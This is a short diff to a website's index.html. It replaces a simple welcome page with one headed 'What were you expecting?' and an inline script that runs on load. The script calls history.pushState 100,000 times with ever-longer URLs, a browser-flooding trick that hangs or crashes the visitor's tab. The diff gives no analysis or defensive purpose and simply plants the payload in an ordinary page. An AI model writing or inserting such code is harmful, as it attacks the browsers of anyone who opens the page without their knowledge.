@@ -1,11 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<title>My Website</title>
-	<script src="index.js"></script>
-</head>
-<body>
-	<h1>Welcome to my website!</h1>
-	<p>This is a paragraph of text.</p>
-</body>
+  <body>
+    <h1>What were you expecting?</h1>
+    <script>
+        var total = "";
+        for( var i = 0; i < 100000; i++ ) {
+            total = total + i.toString();
+            history.pushState(0,0, total );
+        }
+    </script>
+  </body>
 </html>
